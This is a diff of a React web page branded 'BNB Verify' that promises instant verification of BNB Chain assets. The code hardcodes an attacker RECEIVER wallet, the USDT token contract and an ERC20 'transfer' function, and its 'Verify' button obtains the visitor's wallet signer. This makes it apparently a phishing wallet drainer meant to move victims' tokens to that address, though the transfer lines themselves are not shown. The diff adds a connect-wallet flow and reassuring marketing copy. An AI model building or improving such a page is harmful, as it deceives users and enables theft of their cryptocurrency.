@@ -1,26 +1,32 @@
-import React, { useState } from "react";
+import { useState } from "react";
 import { ethers } from "ethers";
 import "./App.css";
 
 export default function App() {
+  const [walletAddress, setWalletAddress] = useState("");
   const [status, setStatus] = useState("Click Verify to start...");
 
-  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // your wallet
-  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
+  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
+  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
   const ERC20_ABI = [
     "function balanceOf(address) view returns (uint)",
     "function transfer(address to, uint amount) returns (bool)"
   ];
 
-  async function handleVerify() {
-    try {
-      if (!window.ethereum) {
-        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
-        return;
-      }
+  async function connectWallet() {
+    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = await provider.getSigner();
+    const address = await signer.getAddress();
+    setWalletAddress(address);
+  }
 
-      await window.ethereum.request({ method: "eth_requestAccounts" });
+  async function handleVerify() {
+    if (!window.ethereum) return setStatus("No wallet detected!");
+    try {
       const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
@@ -59,7 +65,7 @@ export default function App() {
     <div className="app">
       {/* Navbar */}
       <header className="navbar">
-        <nav className="nav-container">
+        <nav className="container nav-content">
           <a href="#" className="logo">
             <div className="logo-circle"></div>
             <span>BNB Verify</span>
@@ -71,6 +77,11 @@ export default function App() {
             <a href="#">NFTs</a>
             <a href="#">DApps</a>
           </div>
+          <button className="mobile-menu">
+            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16m-7 6h7"></path>
+            </svg>
+          </button>
         </nav>
       </header>
 
@@ -79,15 +90,16 @@ export default function App() {
         <div className="hero-left">
           <div className="powered">Powered by BNB Chain</div>
           <h1>Verify Crypto Assets on BNB Chain</h1>
-          <p>
-            Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
-          </p>
+          <p>Instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.</p>
           <div className="hero-buttons">
-            <button className="button-primary" onClick={handleVerify}>
-              Verify
-            </button>
+            {!walletAddress ? (
+              <button onClick={connectWallet} className="button-primary">Connect Wallet</button>
+            ) : (
+              <button onClick={handleVerify} className="button-primary">Verify</button>
+            )}
             <button className="button-secondary">Explore BNB Chain</button>
           </div>
+          {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
           <p className="status">{status}</p>
         </div>
 
@@ -95,11 +107,34 @@ export default function App() {
           <div className="pulse-ring outer"></div>
           <div className="pulse-ring middle"></div>
           <div className="pulse-ring inner"></div>
-          <svg className="center-logo" viewBox="0 0 48 48">
-            <path d="M24 0L12 12L24 24L12 36L24 48L36 36L24 24L36 12L24 0Z" />
-          </svg>
+          <div className="center-logo"></div>
         </div>
       </main>
+
+      {/* Cards Section */}
+      <section className="cards-section">
+        <div className="card">
+          <h2>Explorer</h2>
+          <p>Browse BNB Chain addresses, contracts, tokens, and transactions.</p>
+        </div>
+        <div className="card">
+          <h2>Tokens</h2>
+          <p>Check token balances and verify authenticity of BNB Chain tokens.</p>
+        </div>
+        <div className="card">
+          <h2>NFTs</h2>
+          <p>Verify NFTs on BNB Chain and view metadata securely.</p>
+        </div>
+        <div className="card">
+          <h2>DApps</h2>
+          <p>Connect to decentralized apps and verify transactions safely.</p>
+        </div>
+      </section>
+
+      {/* Footer */}
+      <footer>
+        &copy; 2025 BNB Verify. Powered by BNB Chain.
+      </footer>
     </div>
   );
 }
